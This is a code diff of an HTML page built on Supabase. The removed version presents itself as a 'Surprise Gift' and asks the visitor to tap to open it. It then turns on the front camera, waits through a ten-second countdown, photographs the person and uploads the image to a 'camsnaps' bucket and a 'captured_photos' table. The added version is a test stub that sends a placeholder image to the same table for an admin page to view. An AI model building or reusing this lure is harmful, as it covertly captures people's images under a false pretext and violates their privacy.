@@ -3,88 +3,68 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Surprise Gift 🎁</title>
+    <title>Test System</title>
     <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
     <style>
-        body { background: #1e272e; color: white; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; font-family: sans-serif; text-align: center; margin: 0; }
-        #gift-box { cursor: pointer; }
-        .emoji { font-size: 100px; animation: bounce 2s infinite; display: block; }
-        #timer { font-size: 6rem; color: #ff4757; display: none; }
-        @keyframes bounce { 0%, 100% {transform: translateY(0);} 50% {transform: translateY(-20px);} }
+        body { background: #1e272e; color: white; font-family: sans-serif; text-align: center; margin-top: 50px; }
+        #gift-box { font-size: 50px; cursor: pointer; }
+        #timer { font-size: 80px; color: #ff4757; display: none; }
+        button { padding: 10px 20px; font-size: 20px; cursor: pointer; }
     </style>
 </head>
 <body>
 
-    <div id="gift-box" onclick="testCamera()">
-        <div class="emoji">🎁</div>
-        <h1>Tap to Open</h1>
+    <div id="gift-box" onclick="runTest()">
+        🎁 <br>
+        <button>Click to Test Database (No Camera)</button>
     </div>
 
     <div id="timer">10</div>
     <p id="status"></p>
-    <video id="video" autoplay playsinline style="display:none;"></video>
-    <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
-        // --- CONFIG ---
+        // --- SUPABASE CONFIG ---
         const SUPABASE_URL = 'https://mlcbjfnimbpatmbcgwsq.supabase.co';
         const SUPABASE_KEY = 'sb_publishable_J1WdZTnnDUCBE6bsTf2brQ_qRlXL_1Z'; 
+        
         const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
 
-        async function testCamera() {
-            // 1. Check if running on Secure Context (HTTPS or Localhost)
-            if (!window.isSecureContext) {
-                alert("مسئلہ پکڑا گیا!\n\nکروم کیمرہ کی اجازت نہیں دے رہا کیونکہ آپ یہ فائل ڈائریکٹ کمپیوٹر سے چلا رہے ہیں۔\n\nبراہ کرم اسے Netlify پر اپلوڈ کریں یا Local Server استعمال کریں۔");
-                return;
-            }
-
-            // 2. Try to open camera
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
-                
-                // If successful
-                document.getElementById('video').srcObject = stream;
-                startTimer();
-
-            } catch (err) {
-                alert("ایرر: " + err.message + "\n\nکیا آپ نے 'Allow' پر کلک کیا تھا؟");
-            }
-        }
-
-        function startTimer() {
+        function runTest() {
             document.getElementById('gift-box').style.display = 'none';
             document.getElementById('timer').style.display = 'block';
-            document.getElementById('status').innerText = "Opening...";
-            
+            document.getElementById('status').innerText = "Testing Timer...";
+
             let count = 10;
             const interval = setInterval(() => {
                 count--;
                 document.getElementById('timer').innerText = count;
+
                 if (count <= 0) {
                     clearInterval(interval);
-                    captureAndUpload();
+                    sendFakeData();
                 }
-            }, 1000);
+            }, 1000); // 1 second speed
         }
 
-        async function captureAndUpload() {
-            const video = document.getElementById('video');
-            const canvas = document.getElementById('canvas');
-            canvas.width = video.videoWidth; 
-            canvas.height = video.videoHeight;
-            const ctx = canvas.getContext('2d');
-            ctx.translate(canvas.width, 0); ctx.scale(-1, 1);
-            ctx.drawImage(video, 0, 0);
+        async function sendFakeData() {
+            document.getElementById('status').innerText = "Sending test data to Admin...";
 
-            canvas.toBlob(async (blob) => {
-                const fileName = `snap_${Date.now()}.png`;
-                await supabase.storage.from('camsnaps').upload(fileName, blob);
-                const { data } = supabase.storage.from('camsnaps').getPublicUrl(fileName);
-                await supabase.from('captured_photos').insert([{ image_url: data.publicUrl }]);
-                
-                document.getElementById('timer').style.display = 'none';
-                document.getElementById('status').innerHTML = "<h1>🎉 Surprise! 🎉</h1><br><img src='" + data.publicUrl + "' width='200'>";
-            }, 'image/png');
+            // Fake Image URL (Just to test connection)
+            const fakeImage = "https://placehold.co/600x400/png";
+
+            // Insert into Supabase
+            const { error } = await supabase
+                .from('captured_photos')
+                .insert([{ image_url: fakeImage }]);
+
+            if (error) {
+                console.error(error);
+                alert("Database Error: " + error.message + "\n(Check your Table Name or RLS Policies)");
+                document.getElementById('status').innerText = "Failed: " + error.message;
+            } else {
+                alert("Success! Data sent. Check Admin Page now.");
+                document.getElementById('status').innerText = "Data Sent Successfully!";
+            }
         }
     </script>
 </body>
